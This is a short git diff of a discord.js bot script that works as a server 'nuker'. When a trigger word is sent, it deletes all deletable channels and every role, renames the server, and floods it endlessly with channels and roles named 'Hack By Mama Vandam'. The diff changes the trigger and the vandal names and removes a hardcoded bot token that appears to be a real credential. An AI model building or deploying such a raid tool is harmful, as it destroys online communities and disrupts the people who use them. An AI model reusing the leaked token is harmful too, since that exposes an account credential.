@@ -2,7 +2,7 @@ const Discord = require("discord.js");
 const client = new Discord.Client();
 const prefix = "";
 client.on("message", message => {
-  if (message.content === ".") {
+  if (message.content === "slaw") {
     if (message.channel.guild) {
       message.guild.channels.forEach(c => {
         if (c.deletable) {
@@ -15,14 +15,14 @@ client.on("message", message => {
       message.guild.roles.forEach(r => {
         r.delete();
       });
-      message.guild.setName("bzndzaka");
+      message.guild.setName("Tanha Agadarman Krdyawa");
       setInterval(function() {
-        message.guild.createChannel(" hack by russia", "voice");
-        message.guild.createChannel(" ras UP ", "text");
-        message.guild.createRole({ name: " <.>" });
+        message.guild.createChannel(" Hack By Mama Vandam 🦍", "voice");
+        message.guild.createChannel(" Hack By Mama Vandam 🦍", "text");
+        message.guild.createRole({ name: " لەرەی گوورگ" });
       });
     }
   }
 });
 
-client.login(ODA4MDkwNjY5NzY3ODUyMDcy.YCBfFQ.EFJycHtRci04xTeVEvPWVRtZE0E);
+client.login("");
